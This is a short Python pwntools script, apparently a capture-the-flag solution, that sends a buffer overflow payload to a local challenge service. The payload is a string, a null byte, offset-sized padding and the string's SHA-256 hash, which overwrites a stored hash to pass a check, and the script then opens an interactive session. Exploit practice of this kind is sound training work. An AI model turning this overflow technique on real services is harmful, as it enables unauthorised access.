from pwn import *
from hashlib import sha256

p = remote("0.0.0.0",1338)
#p = process("../deployment/vuln/chall")

user_input = b"hello"
user_input_hash = sha256(user_input).hexdigest()
padding = b"A" * (0x138-0xc8-len(user_input)-1)

payload = user_input + b"\x00" + padding + user_input_hash.encode()
print(payload)

p.sendline(payload)
p.interactive()
